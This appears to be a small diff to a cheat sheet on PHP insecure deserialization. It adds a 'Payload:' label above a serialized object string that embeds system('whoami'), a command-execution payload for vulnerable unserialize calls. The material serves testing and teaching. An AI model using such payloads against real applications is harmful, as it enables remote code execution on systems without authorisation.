@@ -23,8 +23,6 @@
 ## PHP - serialize
 Payload Generator:
 ```sh
-#Payload generator
-
 <?php
 
 class Example2
@@ -37,6 +35,7 @@ print((serialize(new Example2)) . "\n");
 
 ?>
 ```
+Payload:
 ```sh
 O:8:"Example2":1:{s:14:"Example2hook";s:17:"system('whoami');";} 
 ```
